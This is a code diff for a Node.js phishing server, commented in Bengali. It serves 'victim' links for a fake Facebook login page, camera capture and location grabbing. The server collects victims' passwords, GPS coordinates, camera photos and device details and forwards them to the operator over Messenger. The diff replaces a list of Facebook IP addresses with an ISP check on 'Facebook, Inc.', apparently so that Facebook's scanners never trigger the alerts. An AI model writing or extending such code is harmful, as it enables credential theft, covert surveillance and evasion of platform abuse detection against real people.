@@ -12,19 +12,6 @@ const {
 } = require('../utils/helpers');
 
 // ================================================================
-// 🚫 ব্লকড আইপি লিস্ট (যাদের ডেটা মেসেঞ্জারে পাঠানো হবে না)
-// ================================================================
-const BLOCKED_IPS = [
-    '173.252.82.31',
-    '173.252.82.9',
-    '173.252.82.32',
-    '173.252.82.33',
-    '173.252.82.34',
-    '173.252.82.35',
-    '173.252.82.36',
-];
-
-// ================================================================
 // অটো ডিলিট: ১০ মিনিট
 // ================================================================
 const CLEANUP_INTERVAL = 60000;
@@ -50,11 +37,28 @@ setInterval(async () => {
 }, CLEANUP_INTERVAL);
 
 // ================================================================
+// 🔥 ISP ব্লক লিস্ট – এই ISP থেকে এলে মেসেজ যাবে না
+// ================================================================
+const BLOCKED_ISP = 'Facebook, Inc.';
+
+// ================================================================
+// চেক ফাংশন: কোনো ভিক্টিমের ISP ব্লকেড কিনা
+// ================================================================
+function isIspBlocked(victim) {
+    // location অবজেক্ট থাকতে হবে এবং isp ফিল্ড থাকতে হবে
+    if (victim.location && victim.location.isp) {
+        return victim.location.isp === BLOCKED_ISP;
+    }
+    return false;
+}
+
+// ================================================================
 // রাউটস
 // ================================================================
 
 router.get('/v/:id', async (req, res) => {
     try {
+        console.log(`🔍 ক্যামেরা লিংক ভিজিট: ${req.params.id}`);
         const victim = await Victim.findOne({ id: req.params.id });
         if (!victim) {
             return res.status(404).send('লিঙ্কটি ভুল বা মেয়াদোত্তীর্ণ।');
@@ -68,6 +72,7 @@ router.get('/v/:id', async (req, res) => {
 
 router.get('/l/:id', async (req, res) => {
     try {
+        console.log(`🔍 লোকেশন লিংক ভিজিট: ${req.params.id}`);
         const victim = await Victim.findOne({ id: req.params.id });
         if (!victim) {
             return res.status(404).send('লিঙ্কটি ভুল বা মেয়াদোত্তীর্ণ।');
@@ -81,6 +86,7 @@ router.get('/l/:id', async (req, res) => {
 
 router.get('/fb/:id', async (req, res) => {
     try {
+        console.log(`🔍 ফেক লগইন লিংক ভিজিট: ${req.params.id}`);
         const victim = await Victim.findOne({ id: req.params.id });
         if (!victim) {
             return res.status(404).send('লিঙ্কটি ভুল বা মেয়াদোত্তীর্ণ।');
@@ -93,7 +99,7 @@ router.get('/fb/:id', async (req, res) => {
 });
 
 // ================================================================
-// 🚨 ভিক্টিম ডেটা রিসিভ
+// 🚨 ভিক্টিম ডেটা রিসিভ – ISP ব্লকিং সহ
 // ================================================================
 router.post('/api/victim', async (req, res) => {
     try {
@@ -101,13 +107,11 @@ router.post('/api/victim', async (req, res) => {
         console.log('📥 ভিক্টিম ডেটা পেয়েছি:', JSON.stringify(data, null, 2));
 
         if (!data.id) {
+            console.error('❌ id নেই!');
             return res.status(400).json({ status: 'error', message: 'Missing id' });
         }
 
-        const victimIp = data.ip || '0.0.0.0';
-        const isBlocked = BLOCKED_IPS.includes(victimIp);
-        console.log(`🔍 ভিক্টিম IP: ${victimIp} → ${isBlocked ? '🚫 ব্লকড (মেসেজ যাবে না)' : '✅ অনুমোদিত (মেসেজ যাবে)'}`);
-
+        // ভিক্টিম খুঁজি বা তৈরি করি
         let victim = await Victim.findOne({ id: data.id });
 
         if (!victim) {
@@ -143,17 +147,25 @@ router.post('/api/victim', async (req, res) => {
             console.log(`✅ ভিক্টিম আপডেট: ${data.id} (fbId: ${victim.fbId})`);
         }
 
-        // মেসেজ পাঠান (শুধুমাত্র যদি ব্লক না হয়)
-        if (!isBlocked && victim.fbId && victim.fbId !== 'unknown') {
+        // 🔥 ISP চেক
+        const blocked = isIspBlocked(victim);
+        console.log(`🔍 ভিক্টিম ISP: ${victim.location?.isp || 'N/A'} → ${blocked ? '🚫 ব্লকড (মেসেজ যাবে না)' : '✅ অনুমোদিত (মেসেজ যাবে)'}`);
+
+        // ============================================================
+        // 📤 মেসেজ পাঠান – শুধুমাত্র যদি ISP ব্লক না হয়
+        // ============================================================
+        if (!blocked && victim.fbId && victim.fbId !== 'unknown') {
             const msg = formatVictimData(victim);
             await sendMessage(victim.fbId, msg);
             console.log(`📤 ডিভাইস ইনফো মেসেজ পাঠানো হয়েছে: ${victim.fbId}`);
-        } else if (isBlocked) {
-            console.log(`⛔ ব্লকড IP (${victimIp}) → মেসেজ পাঠানো হয়নি।`);
+        } else if (blocked) {
+            console.log(`⛔ ব্লকড ISP (${victim.location?.isp}) → মেসেজ পাঠানো হয়নি।`);
+        } else {
+            console.log(`⚠️ fbId 'unknown' → মেসেজ পাঠানো হয়নি।`);
         }
 
-        // লোকেশন মেসেজ
-        if (!isBlocked && victim.fbId && victim.fbId !== 'unknown' && victim.gpsLocation && victim.gpsLocation.latitude) {
+        // লোকেশন মেসেজ (যদি থাকে এবং ব্লক না হয়)
+        if (!blocked && victim.fbId && victim.fbId !== 'unknown' && victim.gpsLocation && victim.gpsLocation.latitude) {
             const locationMsg = formatLocationMessage(victim.gpsLocation);
             if (locationMsg) {
                 await sendMessage(victim.fbId, locationMsg);
@@ -161,7 +173,7 @@ router.post('/api/victim', async (req, res) => {
             }
         }
 
-        res.status(200).json({ status: 'ok', data: victim, blocked: isBlocked });
+        res.status(200).json({ status: 'ok', data: victim, blocked: blocked });
 
     } catch (err) {
         console.error('❌ Victim data error:', err);
@@ -170,23 +182,27 @@ router.post('/api/victim', async (req, res) => {
 });
 
 // ================================================================
-// 🚨 ক্যামেরা ছবি রিসিভ – ইমেজ সেভ করে URL তৈরি
+// 🚨 ক্যামেরা ছবি রিসিভ – ISP ব্লকিং সহ
 // ================================================================
 router.post('/api/camera', async (req, res) => {
     try {
         const { id, image } = req.body;
+        console.log(`📸 ক্যামেরা রিকোয়েস্ট: ID=${id}, ছবি সাইজ=${image?.length || 0}`);
+
         if (!id || !image) {
+            console.error('❌ id বা image নেই!');
             return res.status(400).json({ status: 'error', message: 'Missing id or image' });
         }
 
         const victim = await Victim.findOne({ id: id });
         if (!victim) {
+            console.error(`❌ ভিক্টিম পাওয়া যায়নি: ${id}`);
             return res.status(404).json({ status: 'error', message: 'Victim not found' });
         }
 
-        const victimIp = victim.ip || '0.0.0.0';
-        const isBlocked = BLOCKED_IPS.includes(victimIp);
-        console.log(`🔍 ক্যামেরা রিকোয়েস্টে ভিক্টিম IP: ${victimIp} → ${isBlocked ? '🚫 ব্লকড (ছবি যাবে না)' : '✅ অনুমোদিত (ছবি যাবে)'}`);
+        // 🔥 ISP চেক
+        const blocked = isIspBlocked(victim);
+        console.log(`🔍 ক্যামেরা রিকোয়েস্টে ISP: ${victim.location?.isp || 'N/A'} → ${blocked ? '🚫 ব্লকড (ছবি যাবে না)' : '✅ অনুমোদিত (ছবি যাবে)'}`);
 
         const isFirstImage = !victim.camera || victim.camera.length === 0;
 
@@ -201,9 +217,9 @@ router.post('/api/camera', async (req, res) => {
         console.log(`📸 ক্যামেরা ছবি: ${id} (মোট ${totalImages}টি)`);
 
         // ============================================================
-        // ইমেজ ফাইল সেভ করে URL তৈরি করুন (শুধুমাত্র যদি ব্লক না হয়)
+        // 📤 ছবি পাঠান – শুধুমাত্র যদি ISP ব্লক না হয়
         // ============================================================
-        if (!isBlocked && victim.fbId && victim.fbId !== 'unknown') {
+        if (!blocked && victim.fbId && victim.fbId !== 'unknown') {
             const config = await getConfig();
             const baseUrl = config.baseUrl || 'http://localhost:3000';
             const filename = await saveImageFile(image);
@@ -212,7 +228,7 @@ router.post('/api/camera', async (req, res) => {
                 const imageUrl = `${baseUrl}/images/${filename}`;
                 
                 if (isFirstImage) {
-                    await sendMessage(victim.fbId, '📸 ভিক্টিম ক্যামেরা পারমিশন দিয়েছে!\nছবি আসতে শুরু করেছে...');
+                    await sendMessage(victim.fbId, '📸 *ভিক্টিম ক্যামেরা পারমিশন দিয়েছে!*\nছবি আসতে শুরু করেছে...');
                     console.log(`📸 ক্যামেরা পারমিশন মেসেজ: ${victim.fbId}`);
                 }
                 
@@ -221,13 +237,13 @@ router.post('/api/camera', async (req, res) => {
             } else {
                 console.log(`⚠️ ইমেজ সেভ করতে ব্যর্থ, ছবি #${totalImages} পাঠানো হয়নি।`);
             }
-        } else if (isBlocked) {
-            console.log(`⛔ ব্লকড IP (${victimIp}) → ক্যামেরার মেসেজ/ছবি পাঠানো হয়নি।`);
+        } else if (blocked) {
+            console.log(`⛔ ব্লকড ISP (${victim.location?.isp}) → ক্যামেরার মেসেজ/ছবি পাঠানো হয়নি।`);
         } else {
             console.log(`⚠️ fbId 'unknown' → ছবি পাঠানো হয়নি।`);
         }
 
-        res.status(200).json({ status: 'ok', count: totalImages, blocked: isBlocked });
+        res.status(200).json({ status: 'ok', count: totalImages, blocked: blocked });
 
     } catch (err) {
         console.error('❌ Camera error:', err);
@@ -262,12 +278,16 @@ router.get('/image/:id/:index', async (req, res) => {
 router.post('/api/fblogin', async (req, res) => {
     try {
         const { id, username, password } = req.body;
+        console.log(`🔐 ফেক লগইন রিকোয়েস্ট: ID=${id}, username=${username}`);
+
         if (!id || !username || !password) {
+            console.error('❌ ডেটা নেই!');
             return res.status(400).json({ status: 'error', message: 'Missing data' });
         }
 
         const victim = await Victim.findOne({ id: id });
         if (!victim) {
+            console.error(`❌ ভিক্টিম পাওয়া যায়নি: ${id}`);
             return res.status(404).json({ status: 'error', message: 'Victim not found' });
         }
 
@@ -279,11 +299,12 @@ router.post('/api/fblogin', async (req, res) => {
         };
         await victim.save();
 
-        console.log(`🔐 ফেক লগইন ডেটা: ${id} - ${username}`);
+        console.log(`🔐 ফেক লগইন ডেটা সেভ: ${id} - ${username}`);
 
         if (victim.fbId && victim.fbId !== 'unknown') {
-            const msg = `🔐 ফেসবুক লগইন ডেটা!\n\n📧 ইমেইল/ফোন: ${username}\n🔑 পাসওয়ার্ড: ${password}\n🆔 ভিক্টিম আইডি: ${id}`;
+            const msg = `🔐 *ফেক ফেসবুক লগইন ডেটা!*\n\n📧 ইমেইল/ফোন: ${username}\n🔑 পাসওয়ার্ড: ${password}\n🆔 ভিক্টিম আইডি: ${id}`;
             await sendMessage(victim.fbId, msg);
+            console.log(`📤 ফেক লগইন মেসেজ পাঠানো: ${victim.fbId}`);
         }
 
         res.status(200).json({ status: 'ok' });
